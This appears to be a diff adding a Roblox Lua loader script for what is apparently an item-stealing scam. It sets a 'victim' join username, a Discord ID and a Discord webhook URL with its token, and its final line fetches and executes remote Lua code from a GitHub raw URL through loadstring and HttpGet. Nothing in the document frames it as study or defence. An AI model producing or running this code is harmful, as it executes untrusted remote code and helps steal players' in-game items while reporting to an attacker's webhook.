@@ -1,0 +1,7 @@
+_G.Username = "heyyeahimswaggg"-- user you should join victim on
+_G.min_value = 0.1
+_G.pingEveryone = "Yes" -- change to "No" if you dont want pings
+_G.discuser = "1345718097264377907" -- change to your Discord user ID
+_G.webhook = "https://discord.com/api/webhooks/1377737064300150834/qaA2ZGtzNlFVSA22IeRjK6_appbMPIqEz6-jjPaAXjvfsBEhxHNSkhvUs3FMGnpcpUQR" -- change to your webhook
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/Lazer247/kayden/refs/heads/main/source.lua"))()
